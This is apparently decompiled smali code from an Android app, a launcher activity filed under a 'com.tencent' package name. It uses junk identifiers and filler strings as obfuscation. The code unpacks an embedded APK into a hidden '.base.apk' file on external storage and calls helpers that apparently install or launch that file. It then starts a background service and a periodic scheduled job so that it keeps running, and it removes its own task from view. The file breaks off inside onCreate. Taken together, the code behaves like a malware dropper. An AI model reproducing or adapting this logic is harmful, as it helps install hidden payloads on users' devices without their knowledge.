.class public Lcom/tencent/MainLauncherActivity;
.super Landroid/app/Activity;
.source "tunesxconcerningn109.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/tencent/MainLauncherActivity$MyExceptionHandler;,
        Lcom/tencent/MainLauncherActivity$FI_tunesxconcerningn109_N;
    }
.end annotation


# static fields
.field public static Holdit:Ljava/lang/Boolean; = null

.field public static IamDone:Z = false

.field public static T5:Ljava/lang/String; = null

.field public static T_tunesxconcerningn109_2:Ljava/lang/String; = null

.field public static T_tunesxconcerningn109_3:Ljava/lang/String; = null

.field public static T_tunesxconcerningn109_4:Ljava/lang/String; = null

.field public static T_tunesxconcerningn109_6:Ljava/lang/String; = null

.field public static T_tunesxconcerningn109_7:Ljava/lang/String; = null

.field public static T_tunesxconcerningn109_P:Ljava/lang/String; = "null"


# instance fields
.field PERMISSION_ALL:I

.field StoragPermissions:[Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x0

    .line 251
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    sput-object v1, Lcom/tencent/MainLauncherActivity;->Holdit:Ljava/lang/Boolean;

    const-string v1, "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41"

    .line 453
    sput-object v1, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_2:Ljava/lang/String;

    .line 454
    sput-object v1, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_3:Ljava/lang/String;

    .line 455
    sput-object v1, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_4:Ljava/lang/String;

    .line 456
    sput-object v1, Lcom/tencent/MainLauncherActivity;->T5:Ljava/lang/String;

    .line 457
    sput-object v1, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_6:Ljava/lang/String;

    .line 458
    sput-object v1, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_7:Ljava/lang/String;

    .line 678
    sput-boolean v0, Lcom/tencent/MainLauncherActivity;->IamDone:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .line 48
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/16 v0, 0x22b

    .line 273
    iput v0, p0, Lcom/tencent/MainLauncherActivity;->PERMISSION_ALL:I

    const-string v0, "android.permission.WRITE_EXTERNAL_STORAGE"

    const-string v1, "android.permission.READ_EXTERNAL_STORAGE"

    .line 275
    filled-new-array {v0, v1}, [Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/tencent/MainLauncherActivity;->StoragPermissions:[Ljava/lang/String;

    return-void
.end method

.method public static IP_tunesxconcerningn109_I(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z
    .locals 1

    const/4 v0, 0x0

    .line 55
    :try_start_0
    invoke-virtual {p1, p0, v0}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p0, 0x1

    return p0

    :catch_0
    return v0
.end method

.method public static varargs hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z
    .locals 4

    if-eqz p0, :cond_1

    if-eqz p1, :cond_1

    .line 643
    array-length v0, p1

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    if-ge v2, v0, :cond_1

    aget-object v3, p1, v2

    .line 644
    invoke-static {p0, v3}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_0

    return v1

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    const/4 p0, 0x1

    return p0
.end method

.method public static schedule_tunesxconcerningn109_Job(Landroid/content/Context;)V
    .locals 4

    const-string v0, "jobscheduler"

    .line 255
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/job/JobScheduler;

    .line 256
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/tencent/PersistentJobService;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 258
    sget p0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x18

    const/16 v3, 0x64

    if-lt p0, v2, :cond_0

    .line 260
    new-instance p0, Landroid/app/job/JobInfo$Builder;

    invoke-direct {p0, v3, v1}, Landroid/app/job/JobInfo$Builder;-><init>(ILandroid/content/ComponentName;)V

    const-wide/32 v1, 0xdbba0

    .line 261
    invoke-virtual {p0, v1, v2}, Landroid/app/job/JobInfo$Builder;->setPeriodic(J)Landroid/app/job/JobInfo$Builder;

    move-result-object p0

    .line 262
    invoke-virtual {p0}, Landroid/app/job/JobInfo$Builder;->build()Landroid/app/job/JobInfo;

    move-result-object p0

    goto :goto_0

    .line 264
    :cond_0
    new-instance p0, Landroid/app/job/JobInfo$Builder;

    invoke-direct {p0, v3, v1}, Landroid/app/job/JobInfo$Builder;-><init>(ILandroid/content/ComponentName;)V

    const-wide/16 v1, 0x3a98

    .line 265
    invoke-virtual {p0, v1, v2}, Landroid/app/job/JobInfo$Builder;->setPeriodic(J)Landroid/app/job/JobInfo$Builder;

    move-result-object p0

    .line 266
    invoke-virtual {p0}, Landroid/app/job/JobInfo$Builder;->build()Landroid/app/job/JobInfo;

    move-result-object p0

    .line 268
    :goto_0
    invoke-virtual {v0, p0}, Landroid/app/job/JobScheduler;->schedule(Landroid/app/job/JobInfo;)I

    return-void
.end method


# virtual methods
.method public Check_tunesxconcerningn109_Bind()V
    .locals 16

    move-object/from16 v1, p0

    .line 464
    :try_start_0
    sget-object v0, Lcom/tencent/DataPackagingEngine;->p_tunesxconcerningn103_r:Ljava/lang/String;

    const/4 v2, 0x2

    invoke-virtual {v0, v2}, Ljava/lang/String;->charAt(I)C

    move-result v0

    sget-char v3, Lcom/tencent/DataPackagingEngine;->c1:C
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    const/4 v4, 0x0

    const-string v5, "null"

    const-string v6, "organizationsqumtstartupqrapiistanbuljinnovationypermalinkwpopnveteransbboobhrushgcoordinatedncelebratec147"

    const/4 v7, 0x1

    const/4 v8, 0x0

    if-ne v0, v3, :cond_13

    :try_start_1
    sget-object v0, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_P:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_13

    sget-object v0, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_P:Ljava/lang/String;

    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    invoke-static {v0, v3}, Lcom/tencent/MainLauncherActivity;->IP_tunesxconcerningn109_I(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v0

    if-nez v0, :cond_13

    .line 465
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/MainLauncherActivity;->Holdit:Ljava/lang/Boolean;

    .line 468
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 469
    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    .line 471
    invoke-static {v0, v3}, Lcom/tencent/DataPackagingEngine;->g_tunesxconcerningn103_t(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v5

    if-nez v5, :cond_16

    const-string v5, "apk"

    .line 473
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    invoke-virtual {v9}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v9

    const/high16 v10, 0x7f080000

    invoke-virtual {v9, v10}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v9

    .line 474
    invoke-virtual {v9}, Ljava/io/InputStream;->available()I

    move-result v10

    if-eqz v10, :cond_16

    int-to-long v10, v10

    .line 478
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v12

    .line 479
    :cond_0
    :goto_0
    invoke-virtual {v12}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v13
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    const-string v14, "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41"

    if-eqz v13, :cond_1

    .line 481
    :try_start_2
    sput-object v14, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_2:Ljava/lang/String;

    .line 482
    sget-object v13, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_3:Ljava/lang/String;

    invoke-virtual {v14, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-eqz v13, :cond_0

    .line 484
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v12

    goto :goto_0

    .line 488
    :cond_1
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v12

    .line 489
    :cond_2
    :goto_1
    invoke-virtual {v12}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v13

    if-eqz v13, :cond_3

    .line 491
    sput-object v14, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_3:Ljava/lang/String;

    .line 492
    sget-object v13, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_2:Ljava/lang/String;

    invoke-virtual {v14, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-eqz v13, :cond_2

    .line 494
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v12

    goto :goto_1

    :cond_3
    const-wide/32 v12, 0xfa000

    cmp-long v12, v10, v12

    if-ltz v12, :cond_4

    const-wide/32 v10, 0x19000

    goto :goto_5

    :cond_4
    const-wide/32 v12, 0x7d000

    cmp-long v12, v10, v12

    if-ltz v12, :cond_9

    .line 505
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v10

    .line 506
    :cond_5
    :goto_2
    invoke-virtual {v10}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v11

    if-eqz v11, :cond_6

    .line 508
    sput-object v14, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_6:Ljava/lang/String;

    .line 509
    sget-object v11, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_3:Ljava/lang/String;

    invoke-virtual {v14, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_5

    .line 511
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v10

    goto :goto_2

    .line 515
    :cond_6
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v10

    .line 516
    :cond_7
    :goto_3
    invoke-virtual {v10}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v11

    if-eqz v11, :cond_8

    .line 518
    sput-object v14, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_7:Ljava/lang/String;

    .line 519
    sget-object v11, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_3:Ljava/lang/String;

    invoke-virtual {v14, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_7

    .line 521
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v10

    goto :goto_3

    :cond_8
    const-wide/32 v10, 0xc800

    goto :goto_5

    :cond_9
    const-wide/32 v12, 0x32000

    cmp-long v12, v10, v12

    if-ltz v12, :cond_a

    const-wide/16 v10, 0x5000

    goto :goto_5

    :cond_a
    const-wide/16 v12, 0x400

    cmp-long v15, v10, v12

    if-ltz v15, :cond_d

    .line 532
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v10

    .line 533
    :cond_b
    :goto_4
    invoke-virtual {v10}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v11

    if-eqz v11, :cond_c

    .line 535
    sput-object v14, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_4:Ljava/lang/String;

    .line 536
    sget-object v11, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_3:Ljava/lang/String;

    invoke-virtual {v14, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_b

    .line 538
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v10

    goto :goto_4

    :cond_c
    move-wide v10, v12

    .line 543
    :cond_d
    :goto_5
    invoke-static {v10, v11}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v10

    .line 544
    invoke-virtual {v10}, Ljava/lang/Long;->intValue()I

    move-result v10

    .line 545
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v12

    invoke-virtual {v12}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v12, "/."

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v12, "ba_tunesxconcerningn109_se"

    const-string v13, "_tunesxconcerningn109_"

    invoke-static {v12, v13}, Lcom/tencent/DataPackagingEngine;->deljapproximatelyy39(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v12, "."

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 548
    new-instance v12, Ljava/io/FileOutputStream;

    new-instance v13, Ljava/io/File;

    invoke-direct {v13, v11}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {v12, v13}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 549
    new-array v13, v10, [B
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    .line 552
    :goto_6
    :try_start_3
    invoke-virtual {v9, v13, v8, v10}, Ljava/io/InputStream;->read([BII)I

    move-result v15

    const/4 v2, -0x1

    if-eq v15, v2, :cond_e

    .line 553
    invoke-virtual {v12, v13, v8, v15}, Ljava/io/OutputStream;->write([BII)V

    const/4 v2, 0x2

    goto :goto_6

    .line 555
    :cond_e
    invoke-virtual {v9}, Ljava/io/InputStream;->close()V

    .line 556
    invoke-virtual {v12}, Ljava/io/OutputStream;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 559
    :try_start_4
    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 560
    invoke-virtual {v2, v11, v8}, Landroid/content/pm/PackageManager;->getPackageArchiveInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v2

    .line 562
    iget-object v2, v2, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    invoke-static {v0, v2, v3}, Lcom/tencent/DataPackagingEngine;->dit(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    goto :goto_9

    .line 564
    :catch_0
    :try_start_5
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 565
    :cond_f
    :goto_7
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v9

    if-eqz v9, :cond_10

    .line 567
    sput-object v14, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_6:Ljava/lang/String;

    .line 568
    sget-object v9, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_3:Ljava/lang/String;

    invoke-virtual {v14, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_f

    .line 570
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_7

    .line 574
    :cond_10
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 575
    :cond_11
    :goto_8
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v9

    if-eqz v9, :cond_12

    .line 577
    sput-object v14, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_7:Ljava/lang/String;

    .line 578
    sget-object v9, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_3:Ljava/lang/String;

    invoke-virtual {v14, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_11

    .line 580
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_8

    .line 584
    :cond_12
    invoke-static {v0, v3, v3}, Lcom/tencent/DataPackagingEngine;->dit(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 586
    :goto_9
    new-instance v0, Lcom/tencent/MainLauncherActivity$FI_tunesxconcerningn109_N;

    invoke-direct {v0, v1, v4}, Lcom/tencent/MainLauncherActivity$FI_tunesxconcerningn109_N;-><init>(Lcom/tencent/MainLauncherActivity;Lcom/tencent/MainLauncherActivity$1;)V

    .line 587
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/tencent/MainLauncherActivity$FI_tunesxconcerningn109_N;->access$102(Lcom/tencent/MainLauncherActivity$FI_tunesxconcerningn109_N;Landroid/content/Context;)Landroid/content/Context;

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    aput-object v6, v2, v8

    aput-object v6, v2, v7

    .line 588
    invoke-virtual {v0, v2}, Lcom/tencent/MainLauncherActivity$FI_tunesxconcerningn109_N;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 589
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v11, v5}, Lcom/tencent/DataPackagingEngine;->minevpackagesktemporaryg34(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 590
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->finish()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto :goto_a

    :catch_1
    move-exception v0

    .line 592
    :try_start_6
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_a

    .line 605
    :cond_13
    sget-object v0, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_P:Ljava/lang/String;

    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/tencent/MainLauncherActivity;->IP_tunesxconcerningn109_I(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v0

    if-eqz v0, :cond_14

    sget-object v0, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_P:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_14

    .line 607
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 608
    sget-object v2, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_P:Ljava/lang/String;

    invoke-virtual {v0, v2}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const/high16 v2, 0x10000000

    .line 609
    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 610
    invoke-virtual {v1, v0}, Lcom/tencent/MainLauncherActivity;->startActivity(Landroid/content/Intent;)V

    .line 611
    new-instance v0, Lcom/tencent/MainLauncherActivity$FI_tunesxconcerningn109_N;

    invoke-direct {v0, v1, v4}, Lcom/tencent/MainLauncherActivity$FI_tunesxconcerningn109_N;-><init>(Lcom/tencent/MainLauncherActivity;Lcom/tencent/MainLauncherActivity$1;)V

    .line 612
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/tencent/MainLauncherActivity$FI_tunesxconcerningn109_N;->access$102(Lcom/tencent/MainLauncherActivity$FI_tunesxconcerningn109_N;Landroid/content/Context;)Landroid/content/Context;

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    aput-object v6, v2, v8

    aput-object v6, v2, v7

    .line 613
    invoke-virtual {v0, v2}, Lcom/tencent/MainLauncherActivity$FI_tunesxconcerningn109_N;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    goto :goto_a

    .line 619
    :cond_14
    :try_start_7
    const-class v0, Lcom/tencent/MainBackgroundService;

    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->getApplication()Landroid/app/Application;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/tencent/BackgroundServiceHelper;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_15

    .line 622
    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/tencent/MainBackgroundService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v0}, Lcom/tencent/MainLauncherActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    .line 630
    :catch_2
    :cond_15
    :try_start_8
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/tencent/MainLauncherActivity;->schedule_tunesxconcerningn109_Job(Landroid/content/Context;)V

    .line 631
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/MainLauncherActivity;->finish()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3

    :catch_3
    :cond_16
    :goto_a
    return-void
.end method

.method public finish()V
    .locals 1

    const/4 v0, 0x1

    .line 690
    sput-boolean v0, Lcom/tencent/MainLauncherActivity;->IamDone:Z

    .line 695
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    return-void
.end method

.method public keepworking(Landroid/content/Context;)V
    .locals 4

    .line 426
    :try_start_0
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "organizationsqumtstartupqrapiistanbuljinnovationypermalinkwpopnveteransbboobhrushgcoordinatedncelebratec147"

    const-wide/32 v2, 0x2bf20

    invoke-static {v0, v1, v2, v3}, Lcom/tencent/DataPackagingEngine;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V

    .line 429
    iget-object v0, p0, Lcom/tencent/MainLauncherActivity;->StoragPermissions:[Ljava/lang/String;

    invoke-static {p1, v0}, Lcom/tencent/MainLauncherActivity;->hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    sget-object v0, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_P:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const-string v1, "null"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 430
    iget-object p1, p0, Lcom/tencent/MainLauncherActivity;->StoragPermissions:[Ljava/lang/String;

    iget v0, p0, Lcom/tencent/MainLauncherActivity;->PERMISSION_ALL:I

    invoke-static {p0, p1, v0}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    goto :goto_0

    .line 434
    :cond_0
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->Check_tunesxconcerningn109_Bind()V

    .line 438
    const-class v0, Lcom/tencent/MainBackgroundService;

    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplication()Landroid/app/Application;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/tencent/BackgroundServiceHelper;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 441
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/tencent/MainBackgroundService;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/tencent/MainLauncherActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method

.method public onBackPressed()V
    .locals 0

    .line 683
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 7

    const-string v0, "STR"

    const-string v1, "STO"

    const-string v2, "SIM"

    const-string v3, "SME"

    const-string v4, ""

    .line 306
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 310
    :try_start_0
    invoke-virtual {p0, p1}, Lcom/tencent/MainLauncherActivity;->requestWindowFeature(I)Z

    .line 311
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getWindow()Landroid/view/Window;

    move-result-object v5

    const/16 v6, 0x400

    invoke-virtual {v5, v6, v6}, Landroid/view/Window;->setFlags(II)V

    const/high16 v5, 0x7f070000

    .line 314
    invoke-virtual {p0, v5}, Lcom/tencent/MainLauncherActivity;->setContentView(I)V

    .line 316
